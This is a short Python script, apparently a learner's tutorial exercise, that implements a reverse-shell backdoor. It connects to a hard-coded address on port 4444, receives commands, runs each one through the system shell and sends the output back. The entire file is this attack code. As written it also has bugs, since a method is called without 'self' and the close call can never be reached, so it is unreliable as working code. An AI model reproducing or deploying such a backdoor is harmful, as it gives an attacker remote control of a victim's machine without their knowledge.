import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # add your target machine ip here
        self.connection.connect((ip, port))

    def execute_system_command(self,command):
        # decode not from tutorial - needed to run commands on windows vs kali
        command = command.decode('utf-8').strip()
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = execute_system_command(command)
            self.connection.send(command_result)
        connection.close()


my_backdoor = Backdoor("192.168.0.35", 4444)
my_backdoor.run()
